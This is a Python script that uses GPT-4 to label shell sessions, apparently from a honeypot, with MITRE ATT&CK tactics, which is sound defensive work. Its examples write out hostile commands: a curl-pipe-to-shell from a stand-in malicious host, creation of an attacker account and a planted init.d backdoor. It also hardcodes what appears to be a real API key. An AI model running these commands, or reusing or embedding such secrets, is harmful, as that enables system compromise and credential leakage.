import os
import openai
import json
from dotenv import load_dotenv
from tqdm import tqdm


# Load API key either from env or hardcoded (replace below with your real key)
load_dotenv()
client= openai.api_key = os.getenv("OPENAI_API_KEY")
openai.api_key = "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"


input_path = "data/labeled_haas.jsonl"
output_path = "data/labeled_output.jsonl"

def classify_session(session_text):
    prompt = f"""
You are a cybersecurity analyst specialized in identifying attacker behavior from shell commands.
Your task: Analyze the session below and classify it by MITRE ATT&CK tactics.
Only output a valid JSON object with a "tactics" field listing tactics observed (no extra text).

Example:
Input:
curl http://malicious.com/malware.sh | sh
Output:
{{"tactics": ["Initial Access", "Execution"]}}

Session:
{session_text}

Output:
"""
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a cybersecurity analyst."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.1,
        max_tokens=150
    )
    return response.choices[0].message.content.strip()

# Example usage:
if __name__ == "__main__":
    example_sessions = [
        "curl http://malicious.com/malware.sh | sh",
        "useradd attacker && passwd attacker 12345",
        "echo 'evil backdoor' > /etc/init.d/backdoor"
    ]

    for session in example_sessions:
        print(f"Session:\n{session}")
        labels = classify_session(session)
        print(f"Labels: {labels}\n")
